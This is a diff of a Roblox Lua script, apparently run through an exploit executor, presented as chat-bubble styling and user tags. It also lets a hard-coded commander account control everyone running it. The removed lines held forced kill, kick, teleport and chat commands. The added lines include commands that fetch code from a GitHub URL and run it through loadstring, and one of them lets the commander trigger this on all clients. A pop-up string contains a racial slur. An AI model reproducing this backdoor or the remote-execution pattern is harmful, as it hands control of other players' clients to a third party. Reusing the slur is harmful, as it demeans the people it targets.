@@ -18,141 +18,67 @@ marker.Name = "HexlustExecuted"
 marker.Value = true
 marker.Parent = PlayerGui
 
--- ───────────────────────────────────────────────
--- Rest of the script
--- ───────────────────────────────────────────────
+-- Commander UserId
+local COMMANDER_ID = 4124175249
 
--- Dark mode chat bubbles
-do
-    local function applyDarkBubbles()
-        if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then return end
+-- Chat bubble color (default dark)
+local bubbleColor = Color3.fromRGB(20, 20, 20)
+
+-- Apply bubbles function
+local function applyBubbles()
+    if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then return end
+    
+    local function styleBubble(bubble)
+        if not bubble:IsA("TextLabel") then return end
+        bubble.BackgroundColor3 = bubbleColor
+        bubble.TextColor3 = Color3.fromRGB(240, 240, 240)
+        bubble.BackgroundTransparency = 0.1
+        bubble.TextStrokeTransparency = 0.8
+        bubble.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
         
-        local function styleBubble(bubble)
-            if not bubble:IsA("TextLabel") then return end
-            bubble.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-            bubble.TextColor3 = Color3.fromRGB(240, 240, 240)
-            bubble.BackgroundTransparency = 0.1
-            bubble.TextStrokeTransparency = 0.8
-            bubble.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-            
-            local corner = bubble:FindFirstChildOfClass("UICorner") or Instance.new("UICorner")
-            corner.CornerRadius = UDim.new(0, 8)
-            corner.Parent = bubble
-            
-            local stroke = bubble:FindFirstChildOfClass("UIStroke") or Instance.new("UIStroke")
-            stroke.Color = Color3.fromRGB(60, 60, 60)
-            stroke.Thickness = 1
-            stroke.Transparency = 0.4
-            stroke.Parent = bubble
+        local corner = bubble:FindFirstChildOfClass("UICorner") or Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 8)
+        corner.Parent = bubble
+        
+        local stroke = bubble:FindFirstChildOfClass("UIStroke") or Instance.new("UIStroke")
+        stroke.Color = Color3.fromRGB(60, 60, 60)
+        stroke.Thickness = 1
+        stroke.Transparency = 0.4
+        stroke.Parent = bubble
+    end
+    
+    for _, bubble in ipairs(workspace:GetDescendants()) do
+        if bubble:IsA("BillboardGui") and bubble.Adornee and bubble.Adornee.Parent and bubble.Adornee.Parent:FindFirstChild("Humanoid") then
+            for _, child in ipairs(bubble:GetDescendants()) do
+                styleBubble(child)
+            end
         end
-        
-        for _, bubble in ipairs(workspace:GetDescendants()) do
-            if bubble:IsA("BillboardGui") and bubble.Adornee and bubble.Adornee.Parent and bubble.Adornee.Parent:FindFirstChild("Humanoid") then
-                for _, child in ipairs(bubble:GetDescendants()) do
+    end
+    
+    workspace.DescendantAdded:Connect(function(desc)
+        if desc:IsA("BillboardGui") and desc.Adornee and desc.Adornee.Parent and desc.Adornee.Parent:FindFirstChild("Humanoid") then
+            task.delay(0.1, function()
+                for _, child in ipairs(desc:GetDescendants()) do
                     styleBubble(child)
                 end
-            end
-        end
-        
-        workspace.DescendantAdded:Connect(function(desc)
-            if desc:IsA("BillboardGui") and desc.Adornee and desc.Adornee.Parent and desc.Adornee.Parent:FindFirstChild("Humanoid") then
-                task.delay(0.1, function()
-                    for _, child in ipairs(desc:GetDescendants()) do
-                        styleBubble(child)
-                    end
-                end)
-            end
-        end)
-    end
-
-    applyDarkBubbles()
-end
-
--- Small notification
-do
-    if PlayerGui then
-        local ScreenGui = Instance.new("ScreenGui")
-        ScreenGui.Name = "HexlustNotify"
-        ScreenGui.ResetOnSpawn = false
-        ScreenGui.IgnoreGuiInset = true
-        ScreenGui.Parent = PlayerGui
-
-        local Frame = Instance.new("Frame")
-        Frame.Size = UDim2.new(0, 240, 0, 50)
-        Frame.Position = UDim2.new(0, 40, 0.5, -25)
-        Frame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
-        Frame.BorderSizePixel = 0
-        Frame.BackgroundTransparency = 1
-        Frame.Parent = ScreenGui
-
-        local UICorner = Instance.new("UICorner")
-        UICorner.CornerRadius = UDim.new(0, 10)
-        UICorner.Parent = Frame
-
-        local Shadow = Instance.new("Frame")
-        Shadow.Size = UDim2.new(1, 10, 1, 10)
-        Shadow.Position = UDim2.new(0, -5, 0, -5)
-        Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-        Shadow.BackgroundTransparency = 1
-        Shadow.ZIndex = -1
-        Shadow.Parent = Frame
-
-        local ShadowCorner = Instance.new("UICorner")
-        ShadowCorner.CornerRadius = UDim.new(0, 12)
-        ShadowCorner.Parent = Shadow
-
-        local Text = Instance.new("TextLabel")
-        Text.Size = UDim2.new(1, -20, 1, -10)
-        Text.Position = UDim2.new(0, 10, 0, 5)
-        Text.BackgroundTransparency = 1
-        Text.Text = "you executed hexlust ak nigger!"
-        Text.TextColor3 = Color3.fromRGB(255, 255, 255)
-        Text.TextSize = 16
-        Text.Font = Enum.Font.GothamSemibold
-        Text.TextTransparency = 1
-        Text.TextScaled = false
-        Text.TextWrapped = false
-        Text.TextXAlignment = Enum.TextXAlignment.Center
-        Text.TextYAlignment = Enum.TextYAlignment.Center
-        Text.Parent = Frame
-
-        local GlowText = Text:Clone()
-        GlowText.TextTransparency = 1
-        GlowText.TextColor3 = Color3.fromRGB(255, 255, 255)
-        GlowText.TextStrokeTransparency = 0.5
-        GlowText.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
-        GlowText.ZIndex = -1
-        GlowText.Parent = Frame
-
-        local tweenIn = TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
-        local tweenOut = TweenInfo.new(1.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In)
-
-        Frame.BackgroundTransparency = 1
-        Text.TextTransparency = 1
-        GlowText.TextTransparency = 1
-        GlowText.TextStrokeTransparency = 1
-        Shadow.BackgroundTransparency = 1
-        Frame.Size = UDim2.new(0, 210, 0, 42)
-
-        TweenService:Create(Frame, tweenIn, {BackgroundTransparency = 0.14, Size = UDim2.new(0, 240, 0, 50)}):Play()
-        TweenService:Create(Text, tweenIn, {TextTransparency = 0}):Play()
-        TweenService:Create(GlowText, tweenIn, {TextTransparency = 0.35, TextStrokeTransparency = 0.5}):Play()
-        TweenService:Create(Shadow, tweenIn, {BackgroundTransparency = 0.84}):Play()
-
-        task.delay(2.2, function()
-            TweenService:Create(Frame, tweenOut, {BackgroundTransparency = 1, Size = UDim2.new(0, 190, 0, 38)}):Play()
-            TweenService:Create(Text, tweenOut, {TextTransparency = 1}):Play()
-            TweenService:Create(GlowText, tweenOut, {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
-            TweenService:Create(Shadow, tweenOut, {BackgroundTransparency = 1}):Play()
-
-            task.delay(1.5, function()
-                if ScreenGui then ScreenGui:Destroy() end
             end)
-        end)
-    end
+        end
+    end)
 end
 
--- General chat channel
+applyBubbles()
+
+-- Color commands
+local colorCommands = {
+    ["!dark"]   = Color3.fromRGB(20, 20, 20),
+    ["!pink"]   = Color3.fromRGB(80, 20, 60),
+    ["!red"]    = Color3.fromRGB(80, 20, 20),
+    ["!green"]  = Color3.fromRGB(20, 80, 40),
+    ["!blue"]   = Color3.fromRGB(20, 40, 80),
+    ["!purple"] = Color3.fromRGB(60, 20, 80),
+}
+
+-- General channel
 local GeneralChannel
 pcall(function()
     local TextChannels = TextChatService:WaitForChild("TextChannels", 20)
@@ -160,6 +86,346 @@ pcall(function()
 end)
 if not GeneralChannel then
     warn("RBXGeneral not found - chat commands & tag sync disabled")
+end
+
+-- Color change (local only)
+if GeneralChannel then
+    GeneralChannel.MessageReceived:Connect(function(msg)
+        if not msg.TextSource then return end
+        if msg.TextSource.UserId ~= LocalPlayer.UserId then return end
+        local txt = msg.Text:lower()
+        if colorCommands[txt] then
+            bubbleColor = colorCommands[txt]
+            applyBubbles()
+        end
+    end)
+end
+
+-- Notification function
+local function displayNotification(message, isMessage, senderName, senderId)
+    if not PlayerGui then return end
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = isMessage and "HexlustMessage" or "HexlustNotify"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.Parent = PlayerGui
+
+    local Frame = Instance.new("Frame")
+    Frame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+    Frame.BorderSizePixel = 0
+    Frame.BackgroundTransparency = 1
+    Frame.Parent = ScreenGui
+
+    if isMessage then
+        Frame.Position = UDim2.new(0.5, -160, 0.5, -60)
+        Frame.Size = UDim2.new(0, 320, 0, 100)
+    else
+        Frame.Position = UDim2.new(0, 40, 0.5, -25)
+        Frame.Size = UDim2.new(0, 240, 0, 50)
+    end
+
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 12)
+    UICorner.Parent = Frame
+
+    local Shadow = Instance.new("Frame")
+    Shadow.Size = UDim2.new(1, 12, 1, 12)
+    Shadow.Position = UDim2.new(0, -6, 0, -6)
+    Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    Shadow.BackgroundTransparency = 1
+    Shadow.ZIndex = -1
+    Shadow.Parent = Frame
+
+    local ShadowCorner = Instance.new("UICorner")
+    ShadowCorner.CornerRadius = UDim.new(0, 14)
+    ShadowCorner.Parent = Shadow
+
+    local Pfp
+    if isMessage and senderId then
+        Pfp = Instance.new("ImageLabel")
+        Pfp.Size = UDim2.new(0, 60, 0, 60)
+        Pfp.Position = UDim2.new(0, 15, 0.5, -30)
+        Pfp.BackgroundTransparency = 1
+        Pfp.ScaleType = Enum.ScaleType.Fit
+        Pfp.Parent = Frame
+
+        local PfpCorner = Instance.new("UICorner")
+        PfpCorner.CornerRadius = UDim.new(1, 0)
+        PfpCorner.Parent = Pfp
+
+        local PfpStroke = Instance.new("UIStroke")
+        PfpStroke.Color = Color3.fromRGB(80, 80, 80)
+        PfpStroke.Thickness = 1.5
+        PfpStroke.Transparency = 0.6
+        PfpStroke.Parent = Pfp
+
+        local success, content, isReady = pcall(function()
+            return Players:GetUserThumbnailAsync(senderId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
+        end)
+
+        if success and isReady then
+            Pfp.Image = content
+        else
+            Pfp.Image = "rbxassetid://0"
+        end
+    end
+
+    local Text = Instance.new("TextLabel")
+    Text.BackgroundTransparency = 1
+    Text.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Text.TextSize = 18
+    Text.Font = Enum.Font.GothamSemibold
+    Text.TextTransparency = 1
+    Text.TextXAlignment = Enum.TextXAlignment.Center
+    Text.TextYAlignment = Enum.TextYAlignment.Center
+    Text.TextWrapped = true
+    Text.Parent = Frame
+
+    if isMessage then
+        Text.Size = UDim2.new(1, -100, 0, 60)
+        Text.Position = UDim2.new(0, 90, 0, 20)
+        Text.Text = message
+    else
+        Text.Size = UDim2.new(1, -20, 1, -10)
+        Text.Position = UDim2.new(0, 10, 0, 5)
+        Text.Text = message
+    end
+
+    local SenderLabel
+    if isMessage and senderName then
+        SenderLabel = Instance.new("TextLabel")
+        SenderLabel.Size = UDim2.new(1, -100, 0, 24)
+        SenderLabel.Position = UDim2.new(0, 90, 0, 5)
+        SenderLabel.BackgroundTransparency = 1
+        SenderLabel.Text = senderName
+        SenderLabel.TextColor3 = Color3.fromRGB(180, 220, 255)
+        SenderLabel.TextSize = 20
+        SenderLabel.Font = Enum.Font.GothamBold
+        SenderLabel.TextTransparency = 1
+        SenderLabel.TextXAlignment = Enum.TextXAlignment.Left
+        SenderLabel.Parent = Frame
+    end
+
+    local GlowText = Text:Clone()
+    GlowText.TextTransparency = 1
+    GlowText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    GlowText.TextStrokeTransparency = 0.6
+    GlowText.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+    GlowText.ZIndex = -1
+    GlowText.Parent = Frame
+
+    local tweenIn = TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+    local tweenOut = TweenInfo.new(1.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In)
+
+    Frame.BackgroundTransparency = 1
+    Text.TextTransparency = 1
+    GlowText.TextTransparency = 1
+    GlowText.TextStrokeTransparency = 1
+    Shadow.BackgroundTransparency = 1
+    if SenderLabel then SenderLabel.TextTransparency = 1 end
+
+    local startSize = isMessage and UDim2.new(0, 280, 0, 80) or UDim2.new(0, 210, 0, 42)
+    Frame.Size = startSize
+
+    TweenService:Create(Frame, tweenIn, {BackgroundTransparency = 0.12, Size = isMessage and UDim2.new(0, 320, 0, 100) or UDim2.new(0, 240, 0, 50)}):Play()
+    TweenService:Create(Text, tweenIn, {TextTransparency = 0}):Play()
+    TweenService:Create(GlowText, tweenIn, {TextTransparency = 0.4, TextStrokeTransparency = 0.6}):Play()
+    TweenService:Create(Shadow, tweenIn, {BackgroundTransparency = 0.8}):Play()
+    if SenderLabel then
+        TweenService:Create(SenderLabel, tweenIn, {TextTransparency = 0}):Play()
+    end
+
+    task.delay(3.5, function()
+        TweenService:Create(Frame, tweenOut, {BackgroundTransparency = 1, Size = startSize}):Play()
+        TweenService:Create(Text, tweenOut, {TextTransparency = 1}):Play()
+        TweenService:Create(GlowText, tweenOut, {TextTransparency = 1, TextStrokeTransparency = 1}):Play()
+        TweenService:Create(Shadow, tweenOut, {BackgroundTransparency = 1}):Play()
+        if SenderLabel then
+            TweenService:Create(SenderLabel, tweenOut, {TextTransparency = 1}):Play()
+        end
+
+        task.delay(1.5, function()
+            if ScreenGui then ScreenGui:Destroy() end
+        end)
+    end)
+end
+
+-- Teleport request popup
+local function showTeleportRequestPopup(senderName, senderId, senderCharacter)
+    if not PlayerGui or not senderCharacter then return end
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "HexlustTPRequest"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.Parent = PlayerGui
+
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0, 400, 0, 260)
+    Frame.Position = UDim2.new(0.5, -200, 0.5, -130)
+    Frame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+    Frame.BorderSizePixel = 0
+    Frame.Parent = ScreenGui
+
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 16)
+    UICorner.Parent = Frame
+
+    local Shadow = Instance.new("Frame")
+    Shadow.Size = UDim2.new(1, 20, 1, 20)
+    Shadow.Position = UDim2.new(0, -10, 0, -10)
+    Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    Shadow.BackgroundTransparency = 1
+    Shadow.ZIndex = -1
+    Shadow.Parent = Frame
+
+    local ShadowCorner = Instance.new("UICorner")
+    ShadowCorner.CornerRadius = UDim.new(0, 20)
+    ShadowCorner.Parent = Shadow
+
+    local Pfp = Instance.new("ImageLabel")
+    Pfp.Size = UDim2.new(0, 100, 0, 100)
+    Pfp.Position = UDim2.new(0.5, -50, 0, 25)
+    Pfp.BackgroundTransparency = 1
+    Pfp.ScaleType = Enum.ScaleType.Fit
+    Pfp.Parent = Frame
+
+    local PfpCorner = Instance.new("UICorner")
+    PfpCorner.CornerRadius = UDim.new(1, 0)
+    PfpCorner.Parent = Pfp
+
+    local PfpStroke = Instance.new("UIStroke")
+    PfpStroke.Color = Color3.fromRGB(100, 180, 255)
+    PfpStroke.Thickness = 2.5
+    PfpStroke.Transparency = 0.4
+    PfpStroke.Parent = Pfp
+
+    local success, content, isReady = pcall(function()
+        return Players:GetUserThumbnailAsync(senderId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+    end)
+    if success and isReady then
+        Pfp.Image = content
+    else
+        Pfp.Image = "rbxassetid://0"
+    end
+
+    local MessageLabel = Instance.new("TextLabel")
+    MessageLabel.Size = UDim2.new(0.92, 0, 0, 80)
+    MessageLabel.Position = UDim2.new(0.04, 0, 0, 145)
+    MessageLabel.BackgroundTransparency = 1
+    MessageLabel.Text = senderName .. " is requesting you to teleport to them..."
+    MessageLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
+    MessageLabel.TextSize = 22
+    MessageLabel.Font = Enum.Font.GothamSemibold
+    MessageLabel.TextWrapped = true
+    MessageLabel.TextXAlignment = Enum.TextXAlignment.Center
+    MessageLabel.TextYAlignment = Enum.TextYAlignment.Top
+    MessageLabel.Parent = Frame
+
+    local ButtonsFrame = Instance.new("Frame")
+    ButtonsFrame.Size = UDim2.new(0.9, 0, 0, 20)
+    ButtonsFrame.Position = UDim2.new(0.05, 0, 1, -50)
+    ButtonsFrame.BackgroundTransparency = 1
+    ButtonsFrame.Parent = Frame
+
+    local UIListLayout = Instance.new("UIListLayout")
+    UIListLayout.FillDirection = Enum.FillDirection.Horizontal
+    UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+    UIListLayout.Padding = UDim.new(0, 20)
+    UIListLayout.Parent = ButtonsFrame
+
+    local AcceptButton = Instance.new("TextButton")
+    AcceptButton.Size = UDim2.new(0, 140, 0, 45)
+    AcceptButton.BackgroundColor3 = Color3.fromRGB(0, 180, 90)
+    AcceptButton.Text = "Accept"
+    AcceptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    AcceptButton.Font = Enum.Font.GothamBold
+    AcceptButton.TextSize = 22
+    AcceptButton.Parent = ButtonsFrame
+
+    local AcceptCorner = Instance.new("UICorner")
+    AcceptCorner.CornerRadius = UDim.new(0, 10)
+    AcceptCorner.Parent = AcceptButton
+
+    local AcceptStroke = Instance.new("UIStroke")
+    AcceptStroke.Color = Color3.fromRGB(0, 255, 120)
+    AcceptStroke.Thickness = 1.5
+    AcceptStroke.Transparency = 0.6
+    AcceptStroke.Parent = AcceptButton
+
+    local DeclineButton = Instance.new("TextButton")
+    DeclineButton.Size = UDim2.new(0, 140, 0, 45)
+    DeclineButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+    DeclineButton.Text = "Decline"
+    DeclineButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    DeclineButton.Font = Enum.Font.GothamBold
+    DeclineButton.TextSize = 22
+    DeclineButton.Parent = ButtonsFrame
+
+    local DeclineCorner = Instance.new("UICorner")
+    DeclineCorner.CornerRadius = UDim.new(0, 10)
+    DeclineCorner.Parent = DeclineButton
+
+    local DeclineStroke = Instance.new("UIStroke")
+    DeclineStroke.Color = Color3.fromRGB(255, 100, 100)
+    DeclineStroke.Thickness = 1.5
+    DeclineStroke.Transparency = 0.6
+    DeclineStroke.Parent = DeclineButton
+
+    Frame.BackgroundTransparency = 1
+    Shadow.BackgroundTransparency = 1
+    MessageLabel.TextTransparency = 1
+    AcceptButton.BackgroundTransparency = 1
+    AcceptButton.TextTransparency = 1
+    DeclineButton.BackgroundTransparency = 1
+    DeclineButton.TextTransparency = 1
+
+    local tweenIn = TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+
+    TweenService:Create(Frame, tweenIn, {BackgroundTransparency = 0.08}):Play()
+    TweenService:Create(Shadow, tweenIn, {BackgroundTransparency = 0.7}):Play()
+    TweenService:Create(MessageLabel, TweenInfo.new(0.9), {TextTransparency = 0}):Play()
+    TweenService:Create(AcceptButton, TweenInfo.new(0.9, Enum.EasingStyle.Quad), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
+    TweenService:Create(DeclineButton, TweenInfo.new(0.9, Enum.EasingStyle.Quad), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
+
+    local function closePopup()
+        local tweenOut = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In)
+        TweenService:Create(Frame, tweenOut, {BackgroundTransparency = 1}):Play()
+        TweenService:Create(Shadow, tweenOut, {BackgroundTransparency = 1}):Play()
+        TweenService:Create(MessageLabel, tweenOut, {TextTransparency = 1}):Play()
+        TweenService:Create(AcceptButton, tweenOut, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+        TweenService:Create(DeclineButton, tweenOut, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+
+        task.delay(0.6, function()
+            if ScreenGui then ScreenGui:Destroy() end
+        end)
+    end
+
+    AcceptButton.MouseButton1Click:Connect(function()
+        if LocalPlayer.Character and senderCharacter then
+            local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            local targetRoot = senderCharacter:FindFirstChild("HumanoidRootPart")
+            if root and targetRoot then
+                root.CFrame = targetRoot.CFrame * CFrame.new(0, 0, -3.5)
+            end
+        end
+        closePopup()
+    end)
+
+    DeclineButton.MouseButton1Click:Connect(closePopup)
+
+    task.delay(25, function()
+        if ScreenGui and ScreenGui.Parent then
+            closePopup()
+        end
+    end)
+end
+
+-- Small notification on execute
+do
+    displayNotification("you executed hexlust ak nigger!", false)
 end
 
 -- Helpers
@@ -176,7 +442,7 @@ local function getPlayerByPartial(partial)
 end
 
 local function getCommander()
-    return Players:GetPlayerByUserId(4124175249)
+    return Players:GetPlayerByUserId(COMMANDER_ID)
 end
 
 -- Freeze state
@@ -204,22 +470,21 @@ LocalPlayer.CharacterAdded:Connect(function(char)
     end
 end)
 
--- ───────────────────────────────────────────────
---          CUSTOM TAGS (4 tiers)
--- ───────────────────────────────────────────────
-
+-- CUSTOM TAGS
 local safeLP = Players.LocalPlayer
 
-local REGULAR_ASSET       = "rbxassetid://87737612757214"      -- executed members
-local OWNER_ASSET         = "rbxassetid://81991054282907"      -- owner
-local SPECIAL_ASSET_1     = "rbxassetid://132746100285086"      -- special 1
-local SPECIAL_ASSET_2     = "rbxassetid://139892439298259"     -- special 2
-local SPECIAL_ASSET_3     = "rbxassetid://102496698805931"     -- new special
+local REGULAR_ASSET       = "rbxassetid://87737612757214"
+local OWNER_ASSET         = "rbxassetid://124210965994311"
+local SPECIAL_ASSET_1     = "rbxassetid://132746100285086"
+local SPECIAL_ASSET_2     = "rbxassetid://139892439298259"
+local SPECIAL_ASSET_3     = "rbxassetid://102496698805931"
+local SPECIAL_ASSET_4     = "rbxassetid://100176101022150"
 
-local OWNER_USERID        = 4124175249
+local OWNER_USERID        = COMMANDER_ID
 local SPECIAL_USERID_1    = 9601915641
 local SPECIAL_USERID_2    = 174386419
 local SPECIAL_USERID_3    = 1856438224
+local SPECIAL_USERID_4    = 4426073712
 
 local SIZE = UDim2.new(0, 32, 0, 32)
 local OFF_X = 1.3
@@ -256,8 +521,10 @@ local function addTag(char, userid)
         img.Image = SPECIAL_ASSET_2
     elseif userid == SPECIAL_USERID_3 then
         img.Image = SPECIAL_ASSET_3
+    elseif userid == SPECIAL_USERID_4 then
+        img.Image = SPECIAL_ASSET_4
     else
-        img.Image = REGULAR_ASSET  -- executed member
+        img.Image = REGULAR_ASSET
     end
 
     img.Parent = bb
@@ -291,7 +558,10 @@ if special2 then tryTagPlayer(special2) end
 local special3 = Players:GetPlayerByUserId(SPECIAL_USERID_3)
 if special3 then tryTagPlayer(special3) end
 
--- Tag sync via chat – both signals apply correct tag
+local special4 = Players:GetPlayerByUserId(SPECIAL_USERID_4)
+if special4 then tryTagPlayer(special4) end
+
+-- Tag sync via chat
 local ch = GeneralChannel
 if ch then
     local INITIAL_SIGNAL  = "♪؍؍"
@@ -312,7 +582,6 @@ if ch then
             if not known[id] then
                 local p = Players:GetPlayerByUserId(id)
                 if p then 
-                    -- Use the correct asset based on who they are
                     tryTagPlayer(p)
                 end
             end
@@ -327,7 +596,7 @@ if ch then
 end
 
 Players.PlayerAdded:Connect(function(plr)
-    if plr.UserId == OWNER_USERID or plr.UserId == SPECIAL_USERID_1 or plr.UserId == SPECIAL_USERID_2 or plr.UserId == SPECIAL_USERID_3 then
+    if plr.UserId == OWNER_USERID or plr.UserId == SPECIAL_USERID_1 or plr.UserId == SPECIAL_USERID_2 or plr.UserId == SPECIAL_USERID_3 or plr.UserId == SPECIAL_USERID_4 then
         tryTagPlayer(plr)
     end
 end)
@@ -351,8 +620,7 @@ end)
 if GeneralChannel then
     GeneralChannel.MessageReceived:Connect(function(msg)
         if not msg.TextSource then return end
-        if msg.TextSource.UserId ~= OWNER_USERID then return end
-
+        local senderId = msg.TextSource.UserId
         local text = msg.Text
         local lowerText = text:lower()
         local args = string.split(lowerText, " ")
@@ -366,149 +634,411 @@ if GeneralChannel then
                    LocalPlayer.Name:lower():sub(1, #tgtArg) == tgtArg
         end
 
-        if cmd == "?bring" and #args >= 2 then
-            local tgtArg = args[2]
-            local destPlayer = nil
-            
-            local toIndex
-            for i = 3, #args do
-                if args[i] == "to" then 
-                    toIndex = i 
-                    break 
-                end
-            end
-            
-            if toIndex and toIndex + 1 <= #args then
-                local destName = table.concat(args, " ", toIndex + 1)
-                destPlayer = getPlayerByPartial(destName)
-            end
+        -- ?message - requires target, commander can use "all"
+        if cmd == "?message" then
+            if not known[senderId] then return end
+            if #args < 3 then return end
 
-            if affectsTarget(tgtArg) then
-                local toPivot
-                if destPlayer and destPlayer.Character and destPlayer.Character.PrimaryPart then
-                    toPivot = destPlayer.Character:GetPivot()
-                else
-                    local commander = getCommander()
-                    if commander and commander.Character and commander.Character.PrimaryPart then
-                        toPivot = commander.Character:GetPivot()
-                    end
-                end
-                
-                if toPivot and LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
-                    LocalPlayer.Character:PivotTo(toPivot)
-                end
-            end
-
-        elseif cmd == "?chat" and #args >= 3 then
             local tgtArg = args[2]
+            local canTargetAll = senderId == COMMANDER_ID
+
+            if tgtArg == "all" and not canTargetAll then return end
+
             local msgStart = text:find(" ", text:find(" ", 1) + 1) or #text
-            local chatText = text:sub(msgStart + 1):match("^%s*(.-)%s*$")
-            
-            if chatText ~= "" and affectsTarget(tgtArg) then
-                task.spawn(function()
-                    pcall(GeneralChannel.SendAsync, GeneralChannel, chatText)
-                end)
-            end
+            local messageText = text:sub(msgStart + 1):match("^%s*(.-)%s*$")
+            if messageText == "" then return end
 
-        elseif cmd == "?kill" and #args >= 2 then
-            if affectsTarget(args[2]) and LocalPlayer.Character then
-                local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-                if h then h.Health = 0 end
-            end
+            local senderPlayer = Players:GetPlayerByUserId(senderId)
+            local senderName = senderPlayer and (senderPlayer.DisplayName ~= "" and senderPlayer.DisplayName or senderPlayer.Name) or "Someone"
 
-        elseif cmd == "?kick" and #args >= 2 then
-            if affectsTarget(args[2]) then 
-                LocalPlayer:Kick("sorri twin dada kicked u ;c") 
-            end
-
-        elseif cmd == "?rj" and #args >= 2 then
-            local tgtArg = args[2]
             if affectsTarget(tgtArg) then
-                local msg = LocalPlayer.DisplayName .. " is getting rebooted..."
-                task.spawn(function()
-                    pcall(GeneralChannel.SendAsync, GeneralChannel, msg)
+                displayNotification(messageText, true, senderName, senderId)
+            end
+
+        -- ?reqtp - commander can use "all"
+        elseif cmd == "?reqtp" then
+            if not known[senderId] then return end
+            if #args < 2 then return end
+
+            local tgtArg = args[2]
+            local canTargetAll = senderId == COMMANDER_ID
+
+            if tgtArg == "all" and not canTargetAll then return end
+
+            local senderPlayer = Players:GetPlayerByUserId(senderId)
+            if not senderPlayer then return end
+            local senderName = senderPlayer.DisplayName ~= "" and senderPlayer.DisplayName or senderPlayer.Name
+            local senderChar = senderPlayer.Character
+
+            if affectsTarget(tgtArg) then
+                showTeleportRequestPopup(senderName, senderId, senderChar)
+            end
+
+        -- ?quizbot - self only for normal, ?qb all for commander (affects everyone)
+        elseif cmd == "?quizbot" or cmd == "?qb" then
+            if not known[senderId] then return end
+
+            local hasArg = #args >= 2
+            local isAll = hasArg and args[2] == "all"
+
+            -- For ?quizbot (normal use) — only self
+            if cmd == "?quizbot" then
+                if senderId ~= LocalPlayer.UserId then return end
+                if hasArg then return end  -- prevent ?quizbot all from normal users
+
+                pcall(function()
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/Damian-11/quizbot/master/quizbot.luau"))()
                 end)
+                return
+            end
+
+            -- For ?qb all — commander only, affects everyone
+            if cmd == "?qb" then
+                if not isAll or senderId ~= COMMANDER_ID then return end
+
+                pcall(function()
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/Damian-11/quizbot/master/quizbot.luau"))()
+                end)
+            end
+
+        -- ?info - self only for normal, ?help all for commander (affects everyone)
+        elseif cmd == "?info" or cmd == "?help" then
+            if not known[senderId] then return end
+
+            local hasArg = #args >= 2
+            local isAll = hasArg and args[2] == "all"
+
+            -- For ?info (normal use) — only self
+            if cmd == "?info" then
+                if senderId ~= LocalPlayer.UserId then return end
+                if hasArg then return end  -- prevent ?info all from normal users
+
+                -- Show basic GUI locally
+                local infoGui = Instance.new("ScreenGui")
+                infoGui.Name = "HexlustInfoGui"
+                infoGui.ResetOnSpawn = false
+                infoGui.Parent = PlayerGui
+
+                local frame = Instance.new("Frame")
+                frame.Size = UDim2.new(0, 340, 0, 420)
+                frame.Position = UDim2.new(0, 20, 1, -440)
+                frame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+                frame.BorderSizePixel = 0
+                frame.Parent = infoGui
+
+                local corner = Instance.new("UICorner")
+                corner.CornerRadius = UDim.new(0, 14)
+                corner.Parent = frame
+
+                local title = Instance.new("TextLabel")
+                title.Size = UDim2.new(1, 0, 0, 50)
+                title.BackgroundTransparency = 1
+                title.Text = "Your Commands"
+                title.TextColor3 = Color3.fromRGB(200, 220, 255)
+                title.TextSize = 22
+                title.Font = Enum.Font.GothamBold
+                title.Parent = frame
+
+                local closeBtn = Instance.new("TextButton")
+                closeBtn.Size = UDim2.new(0, 40, 0, 40)
+                closeBtn.Position = UDim2.new(1, -50, 0, 5)
+                closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+                closeBtn.Text = "X"
